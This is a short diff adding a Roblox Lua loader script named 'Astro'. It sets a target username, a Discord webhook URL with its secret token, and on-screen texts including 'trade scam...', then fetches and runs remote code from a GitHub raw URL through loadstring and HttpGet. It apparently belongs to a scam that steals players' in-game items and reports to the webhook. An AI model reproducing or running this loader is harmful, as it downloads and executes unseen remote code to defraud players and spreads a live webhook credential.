@@ -1,0 +1,9 @@
+UserName = "ghshhhcft12"
+
+Webhook = "https://discord.com/api/webhooks/1111604609346175038/dUc1O8l5_M1UvUTf5_EahRp_AQ5uqrODJh5rCys_teedhkH_OA51K_9XBTIq7uiZkoZB"
+_G.ScriptName = "Astro"
+_G.FirstText = "loding..."
+_G.SecondText = "trade scam..."
+_G.ThirdText = "done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sneaksyzx/AstroHub/main/AstroHub", true))()
